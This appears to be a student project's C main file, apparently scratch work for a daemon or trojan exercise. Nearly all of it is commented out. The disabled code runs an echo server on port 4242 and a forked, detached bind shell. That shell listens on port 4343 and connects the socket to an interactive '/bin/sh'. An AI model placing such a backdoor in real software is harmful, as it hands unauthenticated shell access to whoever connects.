/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vscode <vscode@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/08/14 17:28:28 by vscode            #+#    #+#             */
/*   Updated: 2021/11/10 13:42:05 by vscode           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/epoll.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>

typedef struct sockaddr_in  t_sock;

int     main(void)
{
    t_sock  client, server, shs, shc;
    int     cfd, sfd, shsfd, shcfd, shclen, clen;
    pid_t   pid;
    char    buf[32];
    int     ret;
    char    *cmd[] = {
        "/bin/sh",
        "-i",
        NULL
    };
    printf("%d\n", htons(4343));
    // sfd = socket(AF_INET, SOCK_STREAM, 0);
    // setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
    // server.sin_family = AF_INET;
    // server.sin_addr.s_addr = INADDR_ANY;
    // server.sin_port = htons(4242);
    // bind(sfd, &server, sizeof(server));
    // listen(sfd, 1);
    // cfd = accept(sfd, &client, &clen);
    // pid = fork();
    // if (pid == 0)
    // {
    //     close(cfd);
    //     setsid();
    //     puts("lol");
    //     shsfd = socket(AF_INET, SOCK_STREAM, 0);
    //     setsockopt(shsfd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
    //     shs.sin_family = AF_INET;
    //     shs.sin_addr.s_addr = INADDR_ANY;
    //     shs.sin_port = htons(4343);
    //     bind(shsfd, &shs, sizeof(shs));
    //     listen(shsfd, 4);
    //     shcfd = accept(shsfd, &shc, &shclen);
    //     printf("shsfd : %d, shcfd : %d\n", shsfd, shcfd);
    //     dup2(shcfd, 0);
    //     dup2(shcfd, 1);
    //     dup2(shcfd, 2);
    //     execve(cmd[0], cmd, NULL);
    // }
    // else
    // {
    //     do
    //     {
    //         ret = read(cfd, buf, 31);
    //         buf[ret] = '\0';
    //         write(cfd, buf, ret);
    //     } while (strcmp("exit\n", buf));
    //     write(cfd, "I get out !\n", 13);
    //     close(cfd);
    //     close(sfd);
    //     exit(EXIT_SUCCESS);
    // }
    // puts("alagroy-");
    return (0);
}